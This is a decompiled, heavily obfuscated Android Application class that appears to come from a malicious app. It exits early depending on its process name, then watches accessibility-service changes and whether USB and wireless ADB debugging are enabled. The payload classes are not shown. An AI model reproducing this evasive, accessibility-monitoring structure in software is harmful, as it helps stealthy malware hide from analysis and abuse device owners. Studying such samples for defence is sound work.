package kabjpmz;

import android.app.Application;
import android.os.Handler;
import android.os.Process;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import lmlf.ayxnhy.cjnqnw;
import lmlf.ayxnhy.jrvye;
import lmlf.ayxnhy.mzjcu;
import lmlf.ayxnhy.vcdc;
import lmlf.ayxnhy.zpy;

/* loaded from: classes5.dex */
public class xslqhfr extends Application {
    public static String zgoizo() {
        try {
            BufferedReader bufferedReader = new BufferedReader(new FileReader(new File("/proc/" + Process.myPid() + "/cmdline")));
            String trim = bufferedReader.readLine().trim();
            bufferedReader.close();
            return trim;
        } catch (Exception unused) {
            return "";
        }
    }

    @Override // android.app.Application
    public void onCreate() {
        if (zgoizo().contains("xcmzqsawpqoefcds")) {
            return;
        }
        mzjcu.prwxt();
        super.onCreate();
        registerActivityLifecycleCallbacks(new cjnqnw());
        try {
            ((AccessibilityManager) getSystemService("accessibility")).addAccessibilityStateChangeListener(new jrvye());
            zpy zpyVar = new zpy(new Handler());
            getContentResolver().registerContentObserver(Settings.Global.getUriFor("adb_enabled"), false, zpyVar);
            getContentResolver().registerContentObserver(Settings.Global.getUriFor("adb_wifi_enabled"), false, zpyVar);
            getContentResolver().registerContentObserver(Settings.Secure.getUriFor("enabled_accessibility_services"), false, new vcdc(new Handler()));
        } catch (Exception unused) {
        }
    }
}
